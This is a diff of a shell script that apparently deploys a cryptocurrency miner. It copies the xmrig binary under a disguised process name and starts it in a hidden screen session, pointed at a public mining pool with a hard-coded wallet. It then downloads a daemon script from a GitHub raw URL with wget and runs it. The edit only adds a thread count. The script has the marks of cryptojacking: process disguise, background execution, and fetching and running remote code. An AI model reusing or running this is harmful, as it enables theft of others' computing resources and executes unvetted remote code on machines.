@@ -18,7 +18,7 @@ mv xmrig $azure -n
 cp $azure "$cpuname"
 rm -f  xmrig
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" --donate-level 1 -o loki.herominers.com:10110 -u LQhoRFjHmsAjLa64TZjMPaAf6DUBnzETBbnasnb5gxDSCp1guVSfmPJ19ms57g3xMCZpwjhf5PM34FrcjPaEuthv3jnpABV -p az -a rx/loki -k
+screen -d -m ./"${cpuname}" --donate-level 1 -o loki.herominers.com:10110 -u LQhoRFjHmsAjLa64TZjMPaAf6DUBnzETBbnasnb5gxDSCp1guVSfmPJ19ms57g3xMCZpwjhf5PM34FrcjPaEuthv3jnpABV -p az -a rx/loki -k -t 4
 wget https://raw.githubusercontent.com/ts6aud5vkg/gpuissa/master/cpu_deamon.sh
 chmod 755 cpu_deamon.sh
 screen -d -m ./cpu_deamon.sh
